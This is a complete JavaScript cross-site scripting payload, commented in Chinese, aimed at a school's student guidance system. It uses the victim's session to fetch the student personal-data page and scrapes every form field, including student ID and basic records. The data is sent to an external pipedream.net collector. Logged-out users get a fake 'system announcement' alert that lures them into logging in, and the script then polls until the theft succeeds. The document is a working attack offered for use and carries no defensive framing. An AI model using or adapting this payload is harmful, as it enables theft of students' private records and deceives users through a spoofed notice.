(async () => {
    // === 設定 ===
    const ATTACKER = "https://eokic4rib1w9z4o.m.pipedream.net";
    const TARGET_URL = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI";

    // 資料回傳 (使用 Beacon 或 POST，確保大數據能傳輸)
    const report = (data) => {
        const payload = JSON.stringify(data);
        if (navigator.sendBeacon) {
            navigator.sendBeacon(ATTACKER, payload);
        } else {
            fetch(ATTACKER, {
                method: 'POST',
                mode: 'no-cors',
                body: payload
            });
        }
    };

    // 核心竊取函式
    const trySteal = async () => {
        try {
            // 請求資料頁面
            const res = await fetch(TARGET_URL, { credentials: 'include' });
            const txt = await res.text();
            
            // 判斷是否成功取得個資頁面 (排除登入頁/錯誤頁)
            // 檢查是否包含關鍵標籤，如 "學生學號" 或 "基本資料"
            if (txt.includes("學生學號") || txt.includes("學生基本資料")) {
                
                const parser = new DOMParser();
                const doc = parser.parseFromString(txt, "text/html");
                let stolenData = {};
                
                // === 全欄位解析引擎 ===
                // 遍歷所有表單群組
                doc.querySelectorAll('.form-group').forEach(group => {
                    // 1. 提取標籤 (Key)
                    const labelNode = group.querySelector('label');
                    if (!labelNode) return;
                    
                    // 清理 Key: 去除星號(*)、冒號(:)、空白
                    let key = labelNode.innerText.replace(/[\*\:\s　]/g, '').trim();
                    if (!key) return;

                    // 2. 提取數值 (Value)
                    let value = "N/A";
                    
                    // 優先找靜態文字 (p.form-control-static)
                    const staticP = group.querySelector('p.form-control-static');
                    if (staticP) {
                        value = staticP.innerText.trim();
                    } else {
                        // 其次找輸入框 (input)
                        const input = group.querySelector('input');
                        if (input) {
                            value = input.value.trim();
                        }
                    }
                    
                    // 存入物件
                    stolenData[key] = value;
                });

                console.log("✅ [XSS] 資料竊取成功:", stolenData);
                
                report({
                    status: "SUCCESS_FULL_DATA", 
                    data: stolenData, // 這裡會包含所有欄位
                    timestamp: Date.now()
                });
                
                return true;
            }
        } catch(e) {
            // console.error(e);
        }
        return false;
    };

    // === 執行流程 ===

    // 1. 先偷偷試一次 (萬一使用者已經登入了)
    if (await trySteal()) return;

    // 2. 如果沒登入，開始社會工程學誘導 (只彈一次)
    if (!sessionStorage.getItem('xss_alerted')) {
        sessionStorage.setItem('xss_alerted', 'true');
        
        setTimeout(() => {
            // 這個 Alert 是關鍵，它利用校內網域的權威性欺騙使用者
            alert("【系統公告】\n\n您的學生輔導資料憑證已過期，無法同步。\n\n請重新點擊左側「學生輔導系統」圖示進行身分驗證。");
        }, 1500);
    }

    // 3. 設置輪詢監聽 (Polling)
    // 當使用者被 Alert 騙去點擊登入後，這個迴圈會馬上抓到資料
    const timer = setInterval(async () => {
        // 如果已經偷到了，就停止
        if (sessionStorage.getItem('xss_done')) {
            clearInterval(timer);
            return;
        }

        const success = await trySteal();
        if (success) {
            sessionStorage.setItem('xss_done', 'true'); // 標記已完成，避免重複發送
            clearInterval(timer);
        }
    }, 2000); // 每 2 秒檢查一次

})();